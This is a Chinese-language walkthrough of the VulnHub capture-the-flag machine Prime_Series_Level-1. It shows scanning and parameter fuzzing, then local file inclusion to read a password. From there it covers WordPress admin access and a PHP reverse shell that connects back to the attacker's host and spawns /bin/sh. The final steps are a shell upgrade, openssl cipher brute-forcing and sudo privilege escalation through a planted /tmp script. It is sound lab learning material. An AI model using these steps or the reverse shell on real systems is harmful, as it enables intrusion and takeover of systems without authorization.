# 靶机信息
Prime_Series_Level-1是vulnhub中的一台困难难度的靶机
## 初始信息枚举

tcp和udp端口扫描，尽量扫描两次，以防止网络问题造成遗漏
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
└─$ nmap -sT -p- --min-rate 10000 192.168.218.193 -oA nmapScan/tcPorts
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:46 EDT
Nmap scan report for 192.168.218.193
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:17:A8:CC (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.97 seconds

┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
└─$ nmap -sU -p- --min-rate 10000 192.168.218.193 -oA nmapScan/udPorts
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:46 EDT
Warning: 192.168.218.193 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.218.193
Host is up (0.00095s latency).
All 65535 scanned ports on 192.168.218.193 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 00:0C:29:17:A8:CC (VMware)

Nmap done: 1 IP address (1 host up) scanned in 72.89 seconds
```

指定端口进行详细服务扫描和漏洞扫描
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
└─$ nmap -sV -p22,80 -O 192.168.218.193 -oA nmapScan/detail
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:48 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 100.00% done; ETC: 09:48 (0:00:00 remaining)
Nmap scan report for 192.168.218.193
Host is up (0.00030s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 00:0C:29:17:A8:CC (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.76 seconds
                                                              
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]                                             
└─$ nmap --script=vuln -p22,80 192.168.218.193 -oA nmapScan/vuln                                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:49 EDT                                   
Nmap scan report for 192.168.218.193                                                              
Host is up (0.00032s latency).                                                                    
                                                                                                  
PORT   STATE SERVICE                                                                              
22/tcp open  ssh                                                                                  
80/tcp open  http                                                                                 
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)                     
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                  
|_http-csrf: Couldn't find any CSRF vulnerabilities.                                              
|_http-dombased-xss: Couldn't find any DOM based XSS.                                             
| http-enum:                                                                                      
|   /wordpress/: Blog                                                                             
|_  /wordpress/wp-login.php: Wordpress login page.                                                
| http-slowloris-check:                                                                           
|   VULNERABLE:                                                                                   
|   Slowloris DOS attack                                                                          
|     State: LIKELY VULNERABLE                                                                    
|     IDs:  CVE:CVE-2007-6750                                                                     
|       Slowloris tries to keep many connections to the target web server open and hold           
|       them open as long as possible.  It accomplishes this by opening connections to            
|       the target web server and sending a partial request. By doing so, it starves              
|       the http server's resources causing Denial Of Service.                                    
|                                                                                                 
|     Disclosure date: 2009-09-17                                                                 
|     References:                                                                                 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750                              
|_      http://ha.ckers.org/slowloris/                                                            
MAC Address: 00:0C:29:17:A8:CC (VMware)                                                           
                                                                                                  
Nmap done: 1 IP address (1 host up) scanned in 321.22 seconds   
```

信息不多，只有一个80端口开源利用，漏扫出来cms，看一下 web 页面，只有一张图片。

<img width="1611" height="856" alt="Image" src="https://github.com/user-attachments/assets/786119d2-beaa-4662-bb56-b44ac2ac0584" />

扫一下目录
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
└─$ gobuster dir -u 192.168.218.193 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.218.193
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dev                  (Status: 200) [Size: 131]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.218.193/javascript/]
/image.php            (Status: 200) [Size: 147]
/index.php            (Status: 200) [Size: 136]
/wordpress            (Status: 301) [Size: 322] [--> http://192.168.218.193/wordpress/]
/secret.txt           (Status: 200) [Size: 412]
/server-status        (Status: 403) [Size: 303]
/index.php            (Status: 200) [Size: 136]
Progress: 224656 / 224660 (100.00%)
===============================================================
Finished
===============================================================
```

还是有很多感兴趣的文件，先看 dev 目录

<img width="1608" height="301" alt="Image" src="https://github.com/user-attachments/assets/5501a18a-378c-44cb-8e4e-ade4c17df50a" />

再看一下 secret.txt 文件，有提示。

<img width="1608" height="656" alt="Image" src="https://github.com/user-attachments/assets/7b597d5d-fc5a-45c8-aa13-3dbc9891696d" />

看 location.txt 但是404，那我们先试试 fuzz 一下参数，感觉就是在 image.php 页面。扫了半天，各种换字典，结果最后换 index.php 扫出来了。这里通过更换--hc/hL/hh/hw过滤相同输出的结果
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
└─$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  --hh 136 http://192.168.218.193/index.php?FUZZ=something

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.218.193/index.php?FUZZ=something
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                            
=====================================================================

000002206:   200        7 L      19 W       206 Ch      "file"                                                                                                                             

Total time: 2.856316
Processed Requests: 6453
Filtered Requests: 6452
Requests/sec.: 2259.203
```
成功挖掘到了正确的参数 **file** 提示没有挖掘到正确的文件。

<img width="1918" height="940" alt="Image" src="https://github.com/user-attachments/assets/59f46c9d-2cfb-44d2-9548-2fa3ab12f5d7" />

根据前面的提示要查看这个文件 **location.txt**。

<img width="1919" height="1036" alt="Image" src="https://github.com/user-attachments/assets/7ccaaa9d-3d98-4a23-b8af-708685d25cab" />

提示使用 **secrettier360** 参数在其他 php 页面尝试，那就应该是 image.php 了。

<img width="1919" height="1018" alt="Image" src="https://github.com/user-attachments/assets/c6dbd617-9b10-4573-938a-eb06938c347c" />
成功了，但是没别的提示了，试一下文件包含。成功了，并且有提示寻找 **password.txt** 

<img width="1919" height="1035" alt="Image" src="https://github.com/user-attachments/assets/96044830-b707-4d4f-9155-57391f0cfca8" />
**follow_the_ippsec** 有输出，可能就是密码

<img width="1913" height="684" alt="Image" src="https://github.com/user-attachments/assets/e2b3745f-e45f-4aec-8d51-89fd10d316f9" />
试一下 ssh 的登录，尝试不通，想到之前漏洞扫描到有 wordpress ，试一下登录，成功使用 **victor:follow_the_ippsec** 这一组凭据登录 wp 后台

尝试上传插件 payload ，但是提示没有写权限，提示 **父目录是否可以被写入** ，那再找主题，也是同样的问题。

<img width="1919" height="820" alt="Image" src="https://github.com/user-attachments/assets/35409f7b-689e-4dae-89e2-c330ebda2917" />

再翻翻翻，在主题编辑器中发现了 **secret.php**，那就确定了利用路径

<img width="1919" height="1034" alt="Image" src="https://github.com/user-attachments/assets/09c18020-12b9-487d-9a04-6be0fe7c1e53" />

直接写入反向shell
```
<?php
$ip = '192.168.218.148';  
$port = 4444;             
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', 
    array(0 => $sock, 1 => $sock, 2 => $sock), 
    $pipes);
?>
```
开源cms，主题路径也能找到 **/wordpress/wp-content/themes/twentynineteen/secret.php**
在kali上开启4444端口监听，然后访问。

```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
└─$ sudo nc -lvnp 4444
[sudo] kali 的密码：
listening on [any] 4444 ...
connect to [192.168.218.148] from (UNKNOWN) [192.168.218.193] 54782
/bin/sh: 0: can't access tty; job control turned off
$ bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## 提权
成功拿到shell，那就开始提权了
先升级shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export SHELL=bash
export TERM=xterm-256color 
ctrl+z
stty raw -echo;fg
reset
```
```
www-data@ubuntu:/home/saket$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (root) NOPASSWD: /home/saket/enc
```
使用 **sudo -l** 发现可以执行的sudo操作
```
www-data@ubuntu:/home/saket$ ls -la
total 36
drwxr-xr-x 2 root root  4096 Aug 31  2019 .
drwxr-xr-x 4 root root  4096 Aug 29  2019 ..
-rw------- 1 root root    20 Aug 31  2019 .bash_history
-rwxr-x--x 1 root root 14272 Aug 30  2019 enc
-rw-r--r-- 1 root root    18 Aug 29  2019 password.txt
-rw-r--r-- 1 root root    33 Aug 31  2019 user.txt
www-data@ubuntu:/home/saket$ cat user.txt 
af3c658dcf9d7190da3153519c003456
www-data@ubuntu:/home/saket$ 
```
除了之前利用过的 password 文件还有一个 user.txt 执行一下 enc 问价，要输入密码，搜了一下 enc 关键字，发现是 **openssl** 的子命令，刚好 user.txt 输出的一串加密字符。怎么用呢
但是执行enc需要密码`find / -type f -exec grep -l "password" {} \; 2>/dev/null`，但是一直找不到，就被卡死了，然后看红笔的视频，发现是搜索backup文件。密码在这里：
```
www-data@ubuntu:/opt/backup/server_database$ ls -al
total 12
drwxr-xr-x 2 root root 4096 Aug 30  2019 .
drwxr-xr-x 3 root root 4096 Aug 30  2019 ..
-rw-r--r-- 1 root root   75 Aug 30  2019 backup_pass
-rw-r--r-- 1 root root    0 Aug 30  2019 {hello.8}
www-data@ubuntu:/opt/backup/server_database$ cat backup_pass 
your password for backup_database file enc is 

"backup_password"


Enjoy!
```
使用 sudo 执行之后多了两个文件，enc.txt 和 key.txt ，
```
www-data@ubuntu:/home/saket$ cat enc.txt 
nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
www-data@ubuntu:/home/saket$ cat key.txt 
I know you are the fan of ippsec.

So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
www-data@ubuntu:/home/saket$ 
```
搜索发现要利用 key 解密 enc ，这里我也不会用openssl，看了红笔的视频，需要去爆破enc的加密算法，先使用 `openssl -h` 可以查看所有支持的算法，复制下来制作爆破文件
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
└─$ cat ciphertype | tr ' ' '\n' | sed '/^$/d'
``` 
删除空格，加入换行，保证一个加密算法一行。
由于使用 openssl 的过程中需要将 key 的16进制格式，所以需要将上面的 **ippsec** 的md5格式转换成16进制格式

```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
└─$ echo -n "ippsec" | md5sum | awk -F' ' '{print $1}' | xxd -p | tr -d '\n' 
33363661373463623363393539646531376436316462333035393163333964310a  
```
-n去除换行符，再匹配md5值，再转换成16进制，再去掉换行符

```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
└─$ for i in $(cat ciphertype);do cat enc.txt | openssl enc -d -a -$i -K 33363661373463623363393539646531376436316462333035393163333964310a 2>&/dev/null;echo $i ;done
blake2b512
blake2s256
md4
md5
rmd160
sha1
sha224
sha256
sha3-224
sha3-256
sha3-384
sha3-512
sha384
sha512
sha512-224
sha512-256
shake128
shake256
sm3
aes-128-cbc
l{���[��7�ƏmfE��K����;0�`Z▒�� :�y��N�.�Fj�|z�x�G���rd��/��
                                                          �:�Z91�yMV���@��S▒u����_j,����^+�FAC��ﴌ6���-��~��I�_���%���C���Դ��:��}T�q�4�同��#��ʛaes-128-ecb
aes-192-cbc
~I�l2UFײ:H3V�>Z����§��N[sgħ��:��-]�����v;ń#�M��|g��
            �|&�As
                  ��    �B0��mĖ�*�0r������{Hw� Ƕ�~�g�X�2▒�'+��+�����[D���5��d����!%o    {aes-192-ecb
aes-256-cbc
Dont worry saket one day we will reach to
our destination very soon. And if you forget 
your username then use your old password
==> "tribute_to_ippsec"

Victor,aes-256-ecb
```
爆破出来了，enc是使用 **aes-256-ecb** 加密出来的，并成功解密了，获得一个密码，是saket用户的。
登录saket用户
```
saket@ubuntu:/$ sudo -l
Matching Defaults entries for saket on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saket may run the following commands on ubuntu:
    (root) NOPASSWD: /home/victor/undefeated_victor
saket@ubuntu:/$ sudo ./home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
saket@ubuntu:/$ 
```
报错没找到文件，那就自己写一个。
```
saket@ubuntu:/tmp$ cd /tmp
saket@ubuntu:/tmp$ echo '#!/bin/bash' >challenge
saket@ubuntu:/tmp$ echo '/bin/bash' >>challenge
saket@ubuntu:/tmp$ chmod +x challenge
saket@ubuntu:/tmp$ sudo /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
root@ubuntu:/tmp# 
```
提权成功

## 反思
这个靶机有点意思，学到了很多，包括许多字符处理工具。虽然每走一步都有提示的，但是也有难度，看wp的时候发现还有别的路子，有内核漏洞也可以提权，都不用横向移动。
